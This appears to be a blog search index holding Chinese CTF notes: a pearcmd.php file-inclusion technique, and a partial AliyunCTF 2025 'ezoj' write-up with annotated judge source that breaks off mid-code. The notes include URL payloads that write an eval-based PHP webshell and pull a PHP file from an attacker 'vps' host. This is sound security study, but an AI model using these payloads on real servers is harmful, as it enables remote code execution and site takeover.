<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>php恶意文件包含</title>
      <link href="/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><ol><li><a href="https://tttang.com/archive/1312/">p牛nb!</a></li><li><a href="https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%2f">y4tacker对pearcmd的分析</a></li><li><a href="https://shad0wwalker.com/posts/2151591161.html">pearcmd的利用</a></li><li><a href="https://yuy0ung.github.io/2024/03/27/pearcmd/">!!!pearcmd的利用补充，有对payload的思考</a></li><li><a href="https://blog.csdn.net/Mrs_H/article/details/122386511">pearcmd的其他补充</a></li></ol><h2 id="pearcmd法"><a href="#pearcmd法" class="headerlink" title="pearcmd法"></a>pearcmd法</h2><ol><li><em><strong>什么是pearcmd?</strong></em><ol><li>PEAR（PHP Extension and Application Repository）: 是一个用于PHP的框架和分发系统，它提供了一个库的集合(侧重提供php编写的拓展) –&gt; PEAR不仅包括了PHP代码库，还提供了命令行工具来简化库的安装和维护</li><li>PECL（PHP Extension Community Library）:放 PHP 扩展库的仓库(侧重于提供用 C 编写的扩展)<ol><li>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库</li></ol></li><li>pear&#x2F;pcel是一个命令行工具，可以在命令行中使用</li><li>pearcmd.php: 是 PEAR（PHP Extension and Application Repository）命令行工具的一部分，它允许用户通过命令行与 PEAR 系统进行交互。使用 pearcmd.php 可以执行诸如安装、升级和管理 PHP 包等操作<ol><li>直接使用 pear 命令更常见，它实际上是一个指向 pearcmd.php 脚本的包装器</li></ol></li></ol></li><li><em><strong>利用版本前提</strong></em><ol><li>在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定–with-pear才会安装</li><li>在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php</li><li>php.ini当中, 要开启register_argc_argv这个选项（在Docker中自动开启）<ol><li>如果环境中含有php.ini，则默认register_argc_argv&#x3D;Off；如果环境中没有php.ini，则默认register_argc_argv&#x3D;On</li></ol></li><li>要有文件包含的利用</li><li>确定pearcmd.php的位置(通常为&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php)</li></ol></li><li><em><strong>本质思想</strong></em><ol><li>我们可以通过web的参数来控制pear命令行的功能和参数</li></ol></li><li><em><strong>注意点</strong></em><ol><li>&amp;符无发分割参数，真正能分割参数的是加号</li><li>等号无法赋值，而是会直接被传进去当作参数。</li></ol></li><li><em><strong>利用</strong></em><ol><li><p>利用<code>config-create</code>命令: 第二个参数是写入的文件路径，第一个参数会被写入到这个文件中</p><ul><li><p><input disabled="" type="checkbox"> 这里为什么要使用&#x2F;呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config-create: Create a Default configuration file, must have 2 parameters, root path and filename to save as</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式一: 文件包含的点是?file=</span></span><br><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<span class="meta">&lt;?=</span><span class="title function_ invoke__">phpinfo</span>()<span class="meta">?&gt;</span>+/tmp/kc1zs4.php</span><br><span class="line"><span class="comment">// 格式二: 文件包含的点是?file=</span></span><br><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/<span class="meta">&lt;?=</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="keyword">die</span>()<span class="meta">?&gt;</span>+/tmp/kc1zs4.php</span><br><span class="line">    <span class="comment">// 可能会在输出的时候重复输出很多次，可以多加一个die</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>install</code></p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install: Install Package, pear install http://xxxx/test.php就可以下载php文件，还可以用--installroot指定目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload1: 使用+号做分割</span></span><br><span class="line">?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://vps/kc1zs4.php</span><br><span class="line">    <span class="comment"># 这个payload会将文件下载到网站目录的 &amp;file=/usr/local/lib/php/pearcmd.php\&amp;/tmp/pear/download/ 文件夹下，构造非常巧妙，访问时需要url编码，可以直接访问到文</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload2: 没有根目录写权限，可以将文件下载到/tmp/pear/download</span></span><br><span class="line">?+install+http://localhost/index.html+&amp;file=/usr/local/lib/php/pearcmd.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload3: 没有根目录写权限，将文件下载到/tmp/testinstall/tmp/pear/download下</span></span><br><span class="line">?+install+--installroot+/tmp/testinstall+http://localhost/index.html+&amp;file=/usr/local/lib/php/pearcmd.php</span><br></pre></td></tr></table></figure></li><li><p><code>download</code></p><ol><li>原命令是pear download url，和之前的install一样</li><li>可以将文件写到当前网站目录下</li></ol>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># download: Download Package</span></span><br><span class="line">?+download+http://vps/kc1zs4.php&amp;file=/usr/local/lib/php/pearcmd.php</span><br></pre></td></tr></table></figure></li><li><p>可能有其他命令，需要看: <img src="https://storage.tttang.com/media/attachment/2021/11/01/2de99d32-2d60-43af-8ee5-0111fdc52f38.png" alt="pearcmd.php参数"></p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Commands:</span><br><span class="line">build                  Build an Extension From C Source</span><br><span class="line">bundle                 Unpacks a Pecl Package</span><br><span class="line">channel-add            Add a Channel</span><br><span class="line">channel-alias          Specify an alias to a channel name</span><br><span class="line">channel-delete         Remove a Channel From the List</span><br><span class="line">channel-discover       Initialize a Channel from its server</span><br><span class="line">channel-info           Retrieve Information on a Channel</span><br><span class="line">channel-login          Connects and authenticates to remote channel server</span><br><span class="line">channel-logout         Logs out from the remote channel server</span><br><span class="line">channel-update         Update an Existing Channel</span><br><span class="line">clear-cache            Clear Web Services Cache</span><br><span class="line">config-create          Create a Default configuration file</span><br><span class="line">config-get             Show One Setting</span><br><span class="line">config-help            Show Information About Setting</span><br><span class="line">config-set             Change Setting</span><br><span class="line">config-show            Show All Settings</span><br><span class="line">convert                Convert a package.xml 1.0 to package.xml 2.0 format</span><br><span class="line">cvsdiff                Run a &quot;cvs diff&quot; for all files in a package</span><br><span class="line">cvstag                 Set CVS Release Tag</span><br><span class="line">download               Download Package</span><br><span class="line">download-all           Downloads each available package from the default channel</span><br><span class="line">info                   Display information about a package</span><br><span class="line">install                Install Package</span><br><span class="line">list                   List Installed Packages In The Default Channel</span><br><span class="line">list-all               List All Packages</span><br><span class="line">list-channels          List Available Channels</span><br><span class="line">list-files             List Files In Installed Package</span><br><span class="line">list-upgrades          List Available Upgrades</span><br><span class="line">login                  Connects and authenticates to remote server [Deprecated in favor of channel-login]</span><br><span class="line">logout                 Logs out from the remote server [Deprecated in favor of channel-logout]</span><br><span class="line">makerpm                Builds an RPM spec file from a PEAR package</span><br><span class="line">package                Build Package</span><br><span class="line">package-dependencies   Show package dependencies</span><br><span class="line">package-validate       Validate Package Consistency</span><br><span class="line">pickle                 Build PECL Package</span><br><span class="line">remote-info            Information About Remote Packages</span><br><span class="line">remote-list            List Remote Packages</span><br><span class="line">run-scripts            Run Post-Install Scripts bundled with a package</span><br><span class="line">run-tests              Run Regression Tests</span><br><span class="line">search                 Search remote package database</span><br><span class="line">shell-test             Shell Script Test</span><br><span class="line">sign                   Sign a package distribution file</span><br><span class="line">svntag                 Set SVN Release Tag</span><br><span class="line">uninstall              Un-install Package</span><br><span class="line">update-channels        Update the Channel List</span><br><span class="line">upgrade                Upgrade Package</span><br><span class="line">upgrade-all            Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters]</span><br></pre></td></tr></table></figure></li></ol></li></ol><h2 id="恶意文件包含总结"><a href="#恶意文件包含总结" class="headerlink" title="*恶意文件包含总结"></a>*恶意文件包含总结</h2><ol><li>恶意文件包含的本质就是寻找一个可控的文件进行包含，之后可以传入参数</li><li>两个基本问题<ol><li>如何控制文件内容</li><li>如何获取文件路径</li><li>文件可以保持一段时间</li></ol></li><li>小小总结<ol><li>session: 内容可控，session文件名可控</li><li>php文件处理机制: 内容可控<ol><li>windows下通配符: 统配获取文件名</li><li>phpinfo: phpinfo中有临时文件名</li><li>条件竞争</li><li>文件残余: crash掉php进程(apache和fpm会新开离另一个进程)，<strong>查看残余文件</strong></li></ol></li><li>pearcmde法: <strong>可能可以通过依赖管理的漏洞来引入文件，前提要接触到那个漏洞</strong></li><li>其他可能的思路，比如php伪协议(data:&#x2F;&#x2F;)</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AliyunCTF25</title>
      <link href="/2025/02/25/AliyunCTF25/"/>
      <url>/2025/02/25/AliyunCTF25/</url>
      
        <content type="html"><![CDATA[<h2 id="补充知识点"><a href="#补充知识点" class="headerlink" title="补充知识点"></a>补充知识点</h2><ul><li>ezoj<ul><li>python沙盒<ul><li><input disabled="" type="checkbox"> python audit</li><li><input disabled="" type="checkbox"> python ast pyblocky</li></ul></li></ul></li><li>打卡ok<ul><li><input disabled="" type="checkbox"> 目录字典，类似目录</li><li>cookie<ul><li><input disabled="" type="checkbox"> php cookie</li><li><input disabled="" type="checkbox"> flask cookie</li></ul></li><li>数据库角度进入</li></ul></li></ul><h2 id="ezoj"><a href="#ezoj" class="headerlink" title="ezoj"></a>ezoj</h2><h3 id="ezoj-open"><a href="#ezoj-open" class="headerlink" title="ezoj | open"></a>ezoj | open</h3><blockquote><p>呜呜，难得一道思路对的(中间还有一段看错了)，但是没时间写脚本(坐车回学校</p></blockquote><ol><li><p>&#x2F;source</p><ol><li>看样子,python服务是可以写入文件的</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, send_file</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SUBMISSIONS_PATH = Path(<span class="string">&quot;./submissions&quot;</span>)</span><br><span class="line">PROBLEMS_PATH = Path(<span class="string">&quot;./problems&quot;</span>)</span><br><span class="line"></span><br><span class="line">SUBMISSIONS_PATH.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">CODE_TEMPLATE = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import sys</span></span><br><span class="line"><span class="string">import math</span></span><br><span class="line"><span class="string">import collections</span></span><br><span class="line"><span class="string">import queue</span></span><br><span class="line"><span class="string">import heapq</span></span><br><span class="line"><span class="string">import bisect</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def audit_checker(event,args):</span></span><br><span class="line"><span class="string">    if not event in [&quot;import&quot;,&quot;time.sleep&quot;,&quot;builtins.input&quot;,&quot;builtins.input/result&quot;]:</span></span><br><span class="line"><span class="string">        raise RuntimeError</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sys.addaudithook(audit_checker)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OJTimeLimitExceed</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OJRuntimeError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&quot;static/index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/source&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&quot;server.py&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回全部的问题信息</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/problems&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_problems</span>():</span><br><span class="line">    problems_dir = PROBLEMS_PATH</span><br><span class="line">    problems = []</span><br><span class="line">    <span class="keyword">for</span> problem <span class="keyword">in</span> problems_dir.iterdir():</span><br><span class="line">        <span class="comment"># 构造问题配置文件的完整路径</span></span><br><span class="line">        problem_config_file = problem / <span class="string">&quot;problem.json&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> problem_config_file.exists():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        problem_config = json.load(problem_config_file.<span class="built_in">open</span>(<span class="string">&quot;r&quot;</span>))    <span class="comment"># 可疑注入点</span></span><br><span class="line">        problem = &#123;</span><br><span class="line">            <span class="string">&quot;problem_id&quot;</span>: problem.name,</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: problem_config[<span class="string">&quot;name&quot;</span>],</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: problem_config[<span class="string">&quot;description&quot;</span>],</span><br><span class="line">        &#125;</span><br><span class="line">        problems.append(problem)</span><br><span class="line"></span><br><span class="line">    problems = <span class="built_in">sorted</span>(problems, key=<span class="keyword">lambda</span> x: x[<span class="string">&quot;problem_id&quot;</span>])</span><br><span class="line"></span><br><span class="line">    problems = &#123;<span class="string">&quot;problems&quot;</span>: problems&#125;</span><br><span class="line">    <span class="keyword">return</span> jsonify(problems), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析json格式: code, problem_id</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/submit&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_code</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.get_json()</span><br><span class="line">        code = data.get(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">        problem_id = data.get(<span class="string">&quot;problem_id&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> code <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> problem_id <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> (</span><br><span class="line">                jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;ER&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Missing &#x27;code&#x27; or &#x27;problem_id&#x27;&quot;</span>&#125;),</span><br><span class="line">                <span class="number">400</span>,</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        problem_id = <span class="built_in">str</span>(<span class="built_in">int</span>(problem_id))</span><br><span class="line">        problem_dir = PROBLEMS_PATH / problem_id</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> problem_dir.exists():</span><br><span class="line">            <span class="keyword">return</span> (</span><br><span class="line">                jsonify(</span><br><span class="line">                    &#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;ER&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">f&quot;Problem ID <span class="subst">&#123;problem_id&#125;</span> not found!&quot;</span>&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="number">404</span>,</span><br><span class="line">            )</span><br><span class="line">        <span class="comment"># 128位, 合理竞争不了</span></span><br><span class="line">        code_filename = SUBMISSIONS_PATH / <span class="string">f&quot;submission_<span class="subst">&#123;uuid.uuid4()&#125;</span>.py&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(code_filename, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> code_file:</span><br><span class="line">            <span class="comment"># TEMPLATE里有唯一的黑名单</span></span><br><span class="line">            code = CODE_TEMPLATE + code</span><br><span class="line">            code_file.write(code)</span><br><span class="line"></span><br><span class="line">        result = judge(code_filename, problem_dir)    <span class="comment"># judge()有希望吗</span></span><br><span class="line"></span><br><span class="line">        code_filename.unlink()    <span class="comment"># 请求返回前存在, 延长jdge时间?</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jsonify(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;ER&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 问题一一对应</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge</span>(<span class="params">code_filename, problem_dir</span>):</span><br><span class="line">    test_files = <span class="built_in">sorted</span>(problem_dir.glob(<span class="string">&quot;*.input&quot;</span>))</span><br><span class="line">    total_tests = <span class="built_in">len</span>(test_files)</span><br><span class="line">    passed_tests = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> test_file <span class="keyword">in</span> test_files:</span><br><span class="line">            input_file = test_file</span><br><span class="line">            expected_output_file = problem_dir / <span class="string">f&quot;<span class="subst">&#123;test_file.stem&#125;</span>.output&quot;</span>    <span class="comment"># output也可以是注入点</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> expected_output_file.exists():</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            case_passed = run_code(code_filename, input_file, expected_output_file)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> case_passed:</span><br><span class="line">                passed_tests += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> passed_tests == total_tests:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;AC&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">f&quot;Accepted&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="string">&quot;status&quot;</span>: <span class="string">&quot;WA&quot;</span>,</span><br><span class="line">                <span class="string">&quot;message&quot;</span>: <span class="string">f&quot;Wrang Answer: pass(<span class="subst">&#123;passed_tests&#125;</span>/<span class="subst">&#123;total_tests&#125;</span>)&quot;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">except</span> OJRuntimeError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;RE&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">f&quot;Runtime Error: ret=<span class="subst">&#123;e.args[<span class="number">0</span>]&#125;</span>&quot;</span>&#125;    <span class="comment"># 报错obj有机会吗</span></span><br><span class="line">    <span class="keyword">except</span> OJTimeLimitExceed:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;TLE&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Time Limit Exceed&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_code</span>(<span class="params">code_filename, input_file, expected_output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> infile, <span class="built_in">open</span>(</span><br><span class="line">        expected_output_file, <span class="string">&quot;r&quot;</span></span><br><span class="line">    ) <span class="keyword">as</span> expected_output:</span><br><span class="line">        expected_output_content = expected_output.read().strip()</span><br><span class="line"></span><br><span class="line">        process = subprocess.Popen(</span><br><span class="line">            [<span class="string">&quot;python3&quot;</span>, code_filename],</span><br><span class="line">            stdin=infile,</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">            text=<span class="literal">True</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 最多5s bro</span></span><br><span class="line">            stdout, stderr = process.communicate(timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">            process.kill()</span><br><span class="line">            <span class="keyword">raise</span> OJTimeLimitExceed</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> process.returncode != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> OJRuntimeError(process.returncode)    <span class="comment"># 报错不太可控啊</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检测是否通过</span></span><br><span class="line">        <span class="keyword">if</span> stdout.strip() == expected_output_content:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 非debug模式,可以写道server.py里面</span></span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>关键在于audit_checker绕过: [<a href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-07-%E7%BB%95%E8%BF%87-audit-hook.html]%E4%B8%8D%E5%A4%AA%E5%AF%B9%E5%BA%94%E9%A2%98%E7%9B%AE">https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-07-%E7%BB%95%E8%BF%87-audit-hook.html]不太对应题目</a></p><ol><li>注意:执行完毕后我们的submission文件才会被删除</li><li>栈帧可以绕过限制吗?</li><li>目的: 执行命令并写入server.py</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CODE_TEMPLATE = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import sys</span></span><br><span class="line"><span class="string">import math</span></span><br><span class="line"><span class="string">import collections</span></span><br><span class="line"><span class="string">import queue</span></span><br><span class="line"><span class="string">import heapq</span></span><br><span class="line"><span class="string">import bisect</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def audit_checker(event,args):</span></span><br><span class="line"><span class="string">    if not event in [&quot;import&quot;,&quot;time.sleep&quot;,&quot;builtins.input&quot;,&quot;builtins.input/result&quot;]:</span></span><br><span class="line"><span class="string">        raise RuntimeError</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span 